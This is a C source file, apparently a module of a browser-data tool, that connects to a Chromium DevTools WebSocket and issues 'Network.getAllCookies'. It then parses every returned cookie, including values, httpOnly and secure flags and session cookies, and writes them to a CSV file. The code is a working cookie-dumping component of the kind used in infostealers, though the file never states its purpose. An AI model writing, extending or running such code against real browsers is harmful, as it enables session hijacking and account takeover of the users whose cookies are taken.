#include "dlls/chromium/websocket.h"
#include "shared/cookies.h"

#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>

typedef struct {
    const char *key;
    const char **target;
    bool required;
} field_map_t;

char *find_object_end(char* start) {
    int braces = 0;
    char* p = start;
    while (*p) {
        if (*p == '{') braces++;
        else if (*p == '}') {
            braces--;
            if (braces == 0) return p;
            if (braces < 0) {
                printf("Braces cant be smaller than 0\n");
                return NULL;
            }
        }
        p++;
    }
    return NULL;
}

static char *extract_json_string(char *obj_start, char *obj_end, const char *key, char **next_search_start){
    char pattern[64];

    snprintf(pattern, sizeof(pattern), "\"%s\":", key);

    char *start = strstr(obj_start, pattern);
    if (!start || start > obj_end)
        return NULL;

    start += strlen(pattern);

    while (*start == ' ' || *start == '\t')
        start++;

    if (*start == '"') {
        start++;
        char *end = strchr(start, '"');
        if (!end || end > obj_end) return NULL;
        *end = '\0';
        if (next_search_start) *next_search_start = end + 1;
        return start;
    } else {
        char *end = start;
        while (end < obj_end &&
            *end != ',' &&
            *end != '}')
            end++;

        char saved = *end;
        *end = '\0';
        if (next_search_start) *next_search_start = end + 1;
        return start;
    }
}

static char *get_cookie(cookie_t *cookie, char *start_original) {
    field_map_t fields[] = {
        { "name",          &cookie->name, 1 },
        { "value",         &cookie->value, 1 },
        { "domain",        &cookie->domain, 1 },
        { "path",          &cookie->path, 1 },
        { "expires",       &cookie->expires, 1 },
        { "size",          &cookie->size, 1 },
        { "httpOnly",      &cookie->http_only, 1 },
        { "secure",        &cookie->secure, 1 },
        { "session",       &cookie->session, 1 },
        { "sameSite",      &cookie->same_site, 0 },
        { "priority",      &cookie->priority, 1 },
        { "sameParty",     &cookie->same_party, 1 },
        { "sourceScheme",  &cookie->source_scheme, 1 },
        { "sourcePort",    &cookie->sourcePort, 1 },
    };

    const char *object_start = strstr(start_original, "{\"name");
    if (!object_start) {
        return NULL;
    }
    const char *cookie_end = find_object_end(object_start);
    if (!cookie_end) {
        return NULL;
    }

    char *cursor = start_original;
    for (size_t i = 0; i < sizeof(fields)/sizeof(fields[0]); i++) {
        char *result = extract_json_string(cursor, cookie_end,
                                        fields[i].key, &cursor);

        if (!result && fields[i].required) {
            return NULL;
        }

        *fields[i].target = result;
    }

    return cookie_end + 1;
}

void fetch_cookies(const char *ws_url, const FILE *outfile) {
    printf("Connecting to WebSocket: %s\n", ws_url);

    HINTERNET ws = connect_websocket(ws_url);
    if (!ws) {
        printf("[ERROR] WebSocket connection failed\n");
        return;
    }

    printf("WebSocket connected\n");

    int msg_id = 1;
    char msg[256];
    sprintf(msg,
        "{\"id\":%d,\"method\":\"Network.getAllCookies\"}",
        msg_id);

    printf("Sending Network.getAllCookies (id=%d)\n", msg_id);
    ws_send(ws, msg);

    printf("Waiting for cookies response...\n");
    
    char remaining_buffer[WEBSOCKET_RECV_MAX*2];
    size_t remaining_buffer_length = 0;
    const char *start;
    const char *tmp;
    char *resp;
    while (1) {
        bool last_frame;
        if (!ws_recv(ws, &resp, &last_frame)) {
            printf("[ERROR] ws_recv failed\n");
            break;
        }
        size_t resp_len = strlen(resp);
        if (remaining_buffer_length + resp_len >= WEBSOCKET_RECV_MAX*2) {
            printf("[ERROR] Buffer overflow\n");
            break;
        }
        
        memcpy(remaining_buffer + remaining_buffer_length, resp, resp_len);
        free(resp);
        remaining_buffer_length += resp_len;
        remaining_buffer[remaining_buffer_length] = '\0';

        start = strchr(remaining_buffer, '{');
        if (!start) {
            printf("Starting { not found\n");
            return;
        }
        while (true) {
            cookie_t cookie = {0};
            tmp = get_cookie(&cookie, start);
            if (!tmp) {
                break;
            } else {
                start = tmp;
                write_cookie_csv(outfile, &cookie);
            }
        }

        size_t remaining = remaining_buffer + remaining_buffer_length - start;
        memmove(remaining_buffer, start, remaining);
        remaining_buffer_length = remaining;
        remaining_buffer[remaining_buffer_length] = '\0';

        if (last_frame) {
            break;
        }
    }
    printf("Closing WebSocket\n");

    close_websocket(ws);

    printf("WebSocket closed\n");
}
